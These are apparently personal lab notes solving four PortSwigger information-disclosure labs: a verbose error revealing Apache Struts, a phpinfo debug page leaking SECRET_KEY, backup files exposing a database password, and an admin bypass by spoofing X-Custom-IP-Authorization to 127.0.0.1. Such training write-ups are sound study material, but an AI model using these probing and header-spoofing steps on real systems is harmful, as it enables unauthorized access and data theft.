# 1. Lab [Information disclosure in error messages](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages)

**This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the _version number_ of this _server_.**

use: GET /product?productId=2 HTTP/2
send: GET /product?productId=char HTTP/2

error message

```
Internal Server Error: java.lang.NumberFormatException: For input string: "njh"
```

response:

```php
HTTP/2 500 Internal Server Error
Content-Length: 1684
```

co to search: _Apache Struts 2 2.3.31_

# 2. Lab: [Information disclosure on debug page](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page)

**This lab contains a _debug page that discloses sensitive information_ about the application. To solve the lab, obtain and submit the _SECRET_KEY environment variable_.**

go to: => Target im Burp
find: cgi-bin => phpinfo.php
send: => GET /cgi-bin/phpinfo.php HTTP/
search: SECRET_KEY

```html
<tr>
	<td class="e">SECRET_KEY</td>
	<td class="v">os0rnhokc13t5lj3racdehpnpf5gld57</td>
</tr>
```

# 3. Lab: [Source code disclosure via backup files](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files)

**This lab leaks its source code via _backup files_ _in a hidden directory_. To solve the lab, identify and submit the _database password, which is hard-coded_ in the leaked source code.**

go to: => Target im Burp to root file /
send in repeater: => GET /robots.txt HTTP/2

```php
/robots.txt
```

response:

```php
HTTP/2 200 OK
User-agent: *
Disallow: /backup
```

```php
payload: /backup
```

send:

```php
GET /backup HTTP/2
```

response:

```html
<tr>
	<td>
		<a href="/backup/ProductTemplate.java.bak">ProductTemplate.java.bak</a>
	</td>
	<td></td>
</tr>
```

```url
payload: /backup/ProductTemplate.java.bak
```

send:

```url
GET /backup/ProductTemplate.java.bak HTTP/2
```

response:

```js
  ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "ef5skq98q2lwaqzryhjqdgsxawzvytgv"
        ).withAutoCommit();
```

# Lab: 4[Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)

This lab's *administration interface*has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

**To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the _admin interface_ and _delete the user_**

You can log in to your own _My account_ using the following credentials:

```php
"wiener:peter"
```

```url
find url: => POST /login HTTP/2
Cookie: session=21iyulM0gZEdtpfl7E0xtElHLCsCKSwU
```

check: _csrf=_

```php
csrf=PJsS1ub3Tl2rxXduTNQeskP7MgPniQkn&username=wiener&password=peter
```

send:

```url
GET /administrator HTTP/2
```

response:

```txt
  Not Found 404
```

send:

```url
GET /admin HTTP/2
```

response:

```txt
  HTTP/2 401 Unauthorized
	Admin interface only available to local users

```

view in _page_: => Admin interface _only available to **local** users_

hint:

_when I sent an a**administrator** I received => **Not Found 404**, but when I sent an **admin** I received a response that he is not authorized_ => **401 Unauthorized**. It means it exists. only interface _only available to local users_

send:

```url
GET /admin HTTP/2
```

and add to heder _X-Forwarded-For_ with my local _ip=127.0.0.1_ =>

```php
X-Forwarded-For: 127.0.0.1
```

response:

```txt
HTTP/2 401 Unauthorized
Admin interface only available to local users

```

send in root URL:

```url
TRACE / HTTP/2
```

response:

```txt
HTTP/2 200 OK
```

and in header:=> **X-Custom-IP-Authorization**: **188.253.238.117**

```txt
X-Custom-IP-Authorization: 188.253.238.117
```

send:

```url
GET /admin HTTP/2
```

and in _header_ add: => **X-Custom-IP-Authorization with local ip 127.0.0.1**

```
GET /admin HTTP/2
X-Custom-IP-Authorization: 127.0.0.1
```

search: => Delete
find: href=/admin/_delete_?username=_carlos_

```html
<div>
	<span>carlos - </span>
	<a href="/admin/delete?username=carlos">Delete</a>
</div>
```

send:

```php
GET /admin/delete?username=carlos HTTP/2
```

BOOM
